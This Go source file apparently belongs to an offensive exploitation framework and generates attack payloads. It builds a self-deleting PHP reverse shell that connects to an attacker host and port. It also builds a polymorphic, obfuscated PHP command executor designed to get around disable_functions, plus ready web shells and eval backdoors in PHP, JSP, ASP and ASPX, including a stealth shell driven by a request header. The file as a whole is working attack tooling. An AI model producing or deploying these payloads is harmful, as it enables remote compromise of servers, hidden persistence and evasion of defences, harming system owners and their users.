package payload

import (
	"encoding/base64"
	"fmt"

	"github.com/Chocapikk/pik/pkg/encode"
	"github.com/Chocapikk/pik/pkg/text"
	"github.com/Chocapikk/pik/sdk"
)

func init() {
	sdk.SetPHPReverseShell(PHPReverseShellDrop)
	sdk.SetPHPSystem(PHPSystemDrop)
	sdk.SetPHPEvalShell(PHPEvalReverseShell)
	sdk.SetPHPEvalSystem(PHPEvalSystemExec)
}

// phpReverseShell returns raw PHP code for a reverse shell via proc_open.
func phpReverseShell(lhost string, lport int) string {
	return fmt.Sprintf(
		`$s=fsockopen("%s",%d);$p=proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$pipes);`,
		lhost, lport,
	)
}

// phpExecCmd returns raw PHP code that executes a shell command using
// multiple fallback functions, bypassing disable_functions restrictions.
// Polymorphic: variable names, preamble order, function order, condition
// structure, string encoding, and call style are all randomized per generation.
func phpExecCmd(cmd string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
	v := phpVars("d", "c", "f", "r", "p")
	d, c, f, r, p := v["d"], v["c"], v["f"], v["r"], v["p"]

	preamble := text.Shuffle([]string{
		`@error_reporting(0)`,
		`@set_time_limit(0)`,
		`@ignore_user_abort(1)`,
	})

	// Encode each function name differently for the foreach array.
	simple := text.Shuffle([]string{"system", "passthru", "shell_exec", "exec"})
	encoded := make([]string, len(simple))
	for i, fn := range simple {
		encoded[i] = phpEncodeStr(fn)
	}

	guard := phpGuard(f, d)
	call := phpCall(f, c)

	heavy := text.Shuffle([]string{
		fmt.Sprintf(`if(%s){@pclose(popen($%s,'r'));$%s=1;}`, phpCond(r, d, "popen"), c, r),
		fmt.Sprintf(`if(%s){@proc_open($%s,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$%s);$%s=1;}`, phpCond(r, d, "proc_open"), c, p, r),
		fmt.Sprintf(`if(%s){@pcntl_exec('/bin/sh',array('-c',$%s));$%s=1;}`, phpCond(r, d, "pcntl_exec"), c, r),
		fmt.Sprintf(`if(!$%s&&class_exists('FFI')){@FFI::cdef('int system(const char *command);')->system($%s);$%s=1;}`, r, c, r),
	})

	return fmt.Sprintf(`%s;%s;%s;`+
		`$%s=@ini_get(%s);$%s=base64_decode('%s');`+
		`if(stristr(PHP_OS,'win'))$%s.=" 2>&1\n";`+
		`$%s=0;`+
		`foreach(array(%s,%s,%s,%s) as $%s){if(%s){%s;$%s=1;break;}}`+
		`%s%s%s%s`,
		preamble[0], preamble[1], preamble[2],
		d, phpEncodeStr("disable_functions"), c, b64,
		c,
		r,
		encoded[0], encoded[1], encoded[2], encoded[3], f, guard, call, r,
		heavy[0], heavy[1], heavy[2], heavy[3],
	)
}

// phpCond generates a randomized if-condition that checks:
// the run flag, function existence, and disable_functions.
// All parts use encoded strings and randomized syntax.
func phpCond(r, d, fn string) string {
	notRan := phpNotRan(r)
	exists := phpExistsEncoded(fn)
	notDisabled := phpNotDisabledEncoded(d, fn)
	parts := text.Shuffle([]string{notRan, exists, notDisabled})
	return parts[0] + "&&" + parts[1] + "&&" + parts[2]
}

// phpGuard generates a randomized guard for the foreach loop.
func phpGuard(f, d string) string {
	exists := phpExistsVar(f)
	notDisabled := phpNotDisabledVar(d, f)
	if text.RandBool() {
		return exists + "&&" + notDisabled
	}
	return notDisabled + "&&" + exists
}

// phpCall generates a randomized function call: $f($c) or call_user_func($f,$c).
func phpCall(f, c string) string {
	if text.RandBool() {
		return fmt.Sprintf(`$%s($%s)`, f, c)
	}
	return fmt.Sprintf(`call_user_func($%s,$%s)`, f, c)
}

// phpNotRan returns a randomized check that $r is still 0.
func phpNotRan(r string) string {
	switch text.RandInt(0, 3) {
	case 0:
		return fmt.Sprintf(`!$%s`, r)
	case 1:
		return fmt.Sprintf(`$%s==0`, r)
	default:
		return fmt.Sprintf(`0==$%s`, r)
	}
}

// phpExistsEncoded checks function existence using an encoded function name.
func phpExistsEncoded(fn string) string {
	enc := phpEncodeStr(fn)
	if text.RandBool() {
		return fmt.Sprintf(`is_callable(%s)`, enc)
	}
	return fmt.Sprintf(`function_exists(%s)`, enc)
}

// phpExistsVar returns a randomized callable check using a variable.
func phpExistsVar(f string) string {
	if text.RandBool() {
		return fmt.Sprintf(`is_callable($%s)`, f)
	}
	return fmt.Sprintf(`function_exists($%s)`, f)
}

// phpNotDisabledEncoded checks disable_functions using an encoded function name.
func phpNotDisabledEncoded(d, fn string) string {
	enc := phpEncodeStr(fn)
	switch text.RandInt(0, 3) {
	case 0:
		return fmt.Sprintf(`!stristr($%s,%s)`, d, enc)
	case 1:
		return fmt.Sprintf(`stristr($%s,%s)===false`, d, enc)
	default:
		return fmt.Sprintf(`false===stristr($%s,%s)`, d, enc)
	}
}

// phpNotDisabledVar returns a randomized disable_functions check using a variable.
func phpNotDisabledVar(d, f string) string {
	switch text.RandInt(0, 3) {
	case 0:
		return fmt.Sprintf(`!stristr($%s,$%s)`, d, f)
	case 1:
		return fmt.Sprintf(`stristr($%s,$%s)===false`, d, f)
	default:
		return fmt.Sprintf(`false===stristr($%s,$%s)`, d, f)
	}
}

// phpEncodeStr encodes a string literal for PHP using a random method.
func phpEncodeStr(s string) string {
	switch text.RandInt(0, 5) {
	case 0: // plain
		return fmt.Sprintf(`'%s'`, s)
	case 1: // base64
		return fmt.Sprintf(`base64_decode('%s')`, base64.StdEncoding.EncodeToString([]byte(s)))
	case 2: // str_rot13
		return fmt.Sprintf(`str_rot13('%s')`, encode.ROT13(s))
	case 3: // strrev
		return fmt.Sprintf(`strrev('%s')`, encode.Reverse(s))
	default: // chr() concat
		return phpChrConcat(s)
	}
}

// phpChrConcat encodes a string as PHP chr() concatenation: chr(115).chr(121)...
func phpChrConcat(s string) string {
	var out string
	for i, b := range []byte(s) {
		if i > 0 {
			out += "."
		}
		out += fmt.Sprintf("chr(%d)", b)
	}
	return out
}

// phpVars generates a map of randomized PHP variable names.
func phpVars(names ...string) map[string]string {
	m := make(map[string]string, len(names))
	for _, n := range names {
		m[n] = text.RandAlpha(6)
	}
	return m
}

func phpDrop(code string) string { return fmt.Sprintf(`<?php unlink(__FILE__);%s ?>`, code) }

// PHPReverseShellDrop returns a self-deleting PHP reverse shell for file drop.
func PHPReverseShellDrop(lhost string, lport int) string { return phpDrop(phpReverseShell(lhost, lport)) }

// PHPSystemDrop returns a self-deleting PHP system exec for file drop.
func PHPSystemDrop(cmd string) string { return phpDrop(phpExecCmd(cmd)) }

// PHPEvalReverseShell returns raw PHP code (no tags) for eval() injection.
func PHPEvalReverseShell(lhost string, lport int) string { return phpReverseShell(lhost, lport) }

// PHPEvalSystemExec returns raw PHP code (no tags) for eval() injection.
func PHPEvalSystemExec(cmd string) string { return phpExecCmd(cmd) }

// PHPWebShell returns a minimal PHP web shell.
// Execute commands via: curl target/shell.php?cmd=id
func PHPWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(`<?php system($_GET["%s"]); ?>`, param)
}

// PHPWebShellPassthru returns a PHP web shell using passthru for binary output.
func PHPWebShellPassthru(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(`<?php passthru($_GET["%s"]); ?>`, param)
}

// PHPWebShellPost returns a PHP web shell that reads from POST body.
func PHPWebShellPost(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(`<?php if(isset($_POST["%s"])){system($_POST["%s"]);} ?>`, param, param)
}

// PHPWebShellStealth returns a PHP web shell hidden in a header.
// Execute commands via: curl -H "X-Cmd: id" target/shell.php
func PHPWebShellStealth(header string) string {
	if header == "" {
		header = "X-Cmd"
	}
	return fmt.Sprintf(
		`<?php if(isset($_SERVER["HTTP_%s"])){system($_SERVER["HTTP_%s"]);} ?>`,
		phpHeaderKey(header), phpHeaderKey(header),
	)
}

// PHPEval returns a PHP eval shell (POST parameter).
func PHPEval(param string) string {
	if param == "" {
		param = "code"
	}
	return fmt.Sprintf(`<?php eval($_POST["%s"]); ?>`, param)
}

// JSPWebShell returns a minimal JSP web shell.
func JSPWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(
		`<%% if(request.getParameter("%s")!=null){`+
			`Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("%s")});`+
			`java.io.InputStream is=p.getInputStream();`+
			`int c;while((c=is.read())!=-1){out.write(c);}p.waitFor();} %%>`,
		param, param,
	)
}

// ASPWebShell returns a classic ASP web shell.
func ASPWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(
		`<%%%% Set o=Server.CreateObject("WSCRIPT.SHELL"):Set r=o.Exec("cmd /c "&Request("%s")):Response.Write r.StdOut.ReadAll %%%%>`,
		param,
	)
}

// ASPXWebShell returns an ASPX web shell.
func ASPXWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(
		`<%% @ Page Language="C#" %%>`+
			`<%% System.Diagnostics.Process p=new System.Diagnostics.Process();`+
			`p.StartInfo.FileName="cmd.exe";`+
			`p.StartInfo.Arguments="/c "+Request["%s"];`+
			`p.StartInfo.RedirectStandardOutput=true;`+
			`p.StartInfo.UseShellExecute=false;`+
			`p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %%>`,
		param,
	)
}

func phpHeaderKey(header string) string {
	// PHP converts headers to HTTP_<UPPERCASE_UNDERSCORED>
	result := make([]byte, 0, len(header))
	for _, c := range header {
		switch {
		case c == '-':
			result = append(result, '_')
		case c >= 'a' && c <= 'z':
			result = append(result, byte(c-32))
		default:
			result = append(result, byte(c))
		}
	}
	return string(result)
}
